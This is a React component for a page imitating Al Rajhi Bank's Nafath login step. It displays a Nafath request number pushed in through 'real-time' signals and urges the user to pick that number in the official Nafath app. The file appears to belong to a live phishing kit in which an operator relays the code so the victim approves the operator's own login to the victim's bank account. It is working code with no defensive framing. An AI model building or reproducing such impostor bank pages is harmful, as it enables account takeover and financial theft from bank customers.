import { setCurrentPage } from "@/real-time/utils/utils";
import { useEffect } from "react";
import AlRajhiButton from "@/components/AlRajhiButton";
import { useSignals } from "@preact/signals-react/runtime";
import { code } from "@/real-time/context/signals";
import Main from "@/components/Main";

function getMobilePlatform() {
  const userAgent = navigator.userAgent;

  if (/android/i.test(userAgent)) {
    return "Android";
  }
  if (/iPad|iPhone|iPod/.test(userAgent)) {
    return "iOS";
  }

  return "Desktop";
}

const handleClick = () => {
  const platform = getMobilePlatform();

  if (platform === "iOS")
    window.open(
      "https://apps.apple.com/us/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
    );
  else if (platform === "Android")
    window.open(
      "https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
    );
  else window.open("https://www.iam.gov.sa/");
};

function AlRajhiNafath() {
  useSignals();

  useEffect(() => setCurrentPage("نفاذ الراجحى"), []);
  return (
    <Main variant="al-rajhi">
      <form
        className="flex flex-col max-w-lg mx-auto bg-white"
        style={{
          flexDirection: "column",
          justifyContent: "space-between",
          height: "calc(100dvh - 1.5rem - 39.6px - 3rem)",
        }}
      >
        <div className="bg-[#f5f6fa] py-12 space-y-4 mb-6">
          <img src="images/login-logo.png" alt="logo" className="h-8 mx-auto" />
          <img
            src="/images/nafath.webp"
            className="h-24 mx-auto mb-6 rounded-full"
            alt="nafath logo"
          />
        </div>
        {code.value && (
          <>
            <p className="text-center text-sm font-bold text-black">
              رقم طلب نفاذ هو {code.value}
            </p>
            <p className="text-center text-sm font-medium text-[#8d8e93]">
              يرجى إختيار الرقم في تطبيق نفاذ
            </p>
          </>
        )}
        {!code.value && (
          <p className="text-gray-600 font-medium text-sm text-center animate-pulse">
            يرجي الإنتظار ... سيظهر الكود أمامك خلال لحظات.
          </p>
        )}
        <div className="mx-auto min-h-16 my-6 p-4 aspect-square text-2xl w-fit text-black bg-[#e6e9f0] rounded-full flex justify-center items-center">
          {code.value}
        </div>

        <div className="w-full mt-auto px-4">
          <div>
            <AlRajhiButton
              fullWidth
              variant="contained"
              type="submit"
              onClick={handleClick}
              disabled={!code.value}
            >
              افتح تطبيق نفاذ
            </AlRajhiButton>
          </div>
        </div>
      </form>
    </Main>
  );
}

export default AlRajhiNafath;
